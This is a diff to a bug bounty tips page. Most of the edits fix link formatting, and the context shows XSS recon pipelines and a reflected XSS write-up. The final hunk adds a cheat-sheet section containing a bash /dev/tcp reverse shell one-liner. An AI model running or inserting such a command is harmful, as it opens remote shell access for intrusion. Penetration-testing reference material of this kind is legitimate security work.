@@ -262,7 +262,7 @@ Protip: While you are doing GitHub dorking, try also [GitDorker](https://github.
 
 Detailed information about GitDorker can be found [here](https://medium.com/@obheda12/gitdorker-a-new-tool-for-manual-github-dorking-and-easy-bug-bounty-wins-92a0a0a6b8d5).
 
-Also check related tip [BBT5-8](https://www.infosecmatter.com/bug-bounty-tips-5-aug-17/#8\_github\_dorks\_for\_finding\_secrets).
+Also check related tip [BBT5-8](https://www.infosecmatter.com/bug-bounty-tips-5-aug-17/#8_github_dorks_for_finding_secrets).
 
 #### Simple reflected XSS scenario
 
@@ -270,7 +270,7 @@ Here’s an interesting bug bounty write-up leading to a reflected XSS (Cross-Si
 
 The author was able to successfully identify and exploit XSS despite the fact that the application was filtering some characters and keywords (possibly protected by WAF).
 
-Here’s what [@\_justYnot](https://twitter.com/\_justYnot) did in detail:
+Here’s what [@\_justYnot](https://twitter.com/_justYnot) did in detail:
 
 1. Run subfinder -d target.com | httprobe -c 100 > target.txt
 2. Run cat target.txt | waybackurls | gf xss | kxss
@@ -280,7 +280,7 @@ Here’s what [@\_justYnot](https://twitter.com/\_justYnot) did in detail:
 6. After trying some payloads, one payload with event as onbegin worked and XSS executed successfully!
 7. Made a good report, sent it to the company last month and got rewarded \$$
 
-This is a perfect example why we should never give up when things get difficult. When you’ve got a lead, you have to keep pushing to get the reward! Here’s list of tools [@\_justYnot](https://twitter.com/\_justYnot) used:
+This is a perfect example why we should never give up when things get difficult. When you’ve got a lead, you have to keep pushing to get the reward! Here’s list of tools [@\_justYnot](https://twitter.com/_justYnot) used:
 
 * https://github.com/projectdiscovery/subfinder
 * https://github.com/tomnomnom/httprobe
@@ -386,17 +386,17 @@ intitle:"Citrix Gateway" -site:[citrix.com](http://citrix.com/)
 
 #### Some awesome people on twitter
 
-* [@Dark\_Knight](https://twitter.com/\_Dark\_Knight\_)
+* [@Dark\_Knight](https://twitter.com/_Dark_Knight_)
 * [@El3ctr0Byt3s](https://twitter.com/El3ctr0Byt3s)
 * [@sw33tLie](https://twitter.com/sw33tLie)
 * [@sillydadddy](https://twitter.com/sillydadddy)
-* [@manas\_hunter](https://twitter.com/manas\_hunter)
+* [@manas\_hunter](https://twitter.com/manas_hunter)
 * [@hunter0x7](https://twitter.com/hunter0x7)
 * [@GodfatherOrwa](https://twitter.com/GodfatherOrwa)
-* [@\_justYnot](https://twitter.com/\_justYnot)
+* [@\_justYnot](https://twitter.com/_justYnot)
 * [@0xAsm0d3us](https://twitter.com/0xAsm0d3us)
 * [@sratarun](https://twitter.com/sratarun)
-* [@cry\_\_pto](https://twitter.com/cry\_\_pto)
+* [@cry\_\_pto](https://twitter.com/cry__pto)
 * [@RathiArpeet](https://twitter.com/RathiArpeet)
 * [@Alra3ees](https://twitter.com/Alra3ees)
 * [@N008x](https://twitter.com/N008x)
@@ -526,6 +526,12 @@ bash JSFScan.sh -l targets.txt --all -r -o filname
 assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
 ```
 {% endcode %}
+
+#### Get Reverse Shell:
+
+```
+$(bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1)
+```
 
 #### Opposite to Keyhacks -> nokeyhacks:
 
